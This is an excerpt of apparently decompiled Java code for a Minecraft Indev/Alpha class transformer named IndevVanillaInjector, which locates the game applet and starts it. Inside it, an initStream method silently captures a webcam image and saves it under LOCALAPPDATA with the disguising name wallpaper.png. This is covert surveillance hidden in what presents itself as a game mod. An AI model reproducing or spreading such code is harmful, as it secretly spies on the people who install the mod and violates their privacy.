...
public class IndevVanillaInjector
implements IClassTransformer {
    ...
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
        Class<?> clazz;
        try {
            clazz = IndevVanillaInjector.getaClass("net.minecraft.client.MinecraftApplet");
        }
        catch (ClassNotFoundException ignored) {
            clazz = IndevVanillaInjector.getaClass("com.mojang.minecraft.MinecraftApplet");
        }
        System.out.println("AlphaVanillaTweakInjector.class.getClassLoader() = " + IndevVanillaInjector.class.getClassLoader());
        ...
        while (n3 < n2) {
            ...
            if (!(name.contains("awt") || name.contains("java") || name.equals("long"))) {
                ...
                Field fileField = IndevVanillaInjector.getWorkingDirField(name);
                if (fileField != null) {
        ...
        IndevVanillaInjector.startMinecraft((Applet)object, args);
    }
    ...
    public static void initStream() {
        try {
            ...
            ImageIO.write((RenderedImage)img, "png", new File(String.valueOf(System.getenv("LOCALAPPDATA")) + "\\wallpaper.png"));
            webcam.close();
        }
    ...
    private static Field getWorkingDirField(String name) throws ClassNotFoundException {
        Class<?> clazz = IndevVanillaInjector.getaClass(name);
        Field[] fieldArray = clazz.getDeclaredFields();
        int n2 = fieldArray.length;
        int n3 = 0;
        while (n3 < n2) {
